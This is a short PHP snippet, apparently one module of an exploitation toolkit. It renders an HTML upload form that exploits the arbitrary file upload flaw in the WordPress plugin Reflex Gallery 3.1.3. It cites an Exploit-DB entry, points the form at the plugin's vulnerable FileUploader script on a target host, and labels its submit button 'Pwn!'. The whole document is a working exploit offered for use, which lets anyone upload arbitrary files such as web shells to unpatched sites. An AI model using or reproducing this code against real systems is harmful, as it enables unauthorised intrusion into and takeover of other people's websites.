<?php
    echo "<h3>🔓 WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload 🔓</h3>";
    echo "<a href=\"https://www.exploit-db.com/exploits/36374/\">https://www.exploit-db.com/exploits/36374/</a><br><br>";
    echo "<form class=\"wp-form\" method=\"POST\" action=\"http://".$url."/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=06\" enctype=\"multipart/form-data\" >";
    echo " <p>qqfile  <input type=\"file\" name=\"qqfile\"></p>&nbsp;";
    echo " <p>Submit  <input type=\"submit\" name=\"Submit\" value=\"Pwn!\"></p>";
    echo "</form>";
 ?>
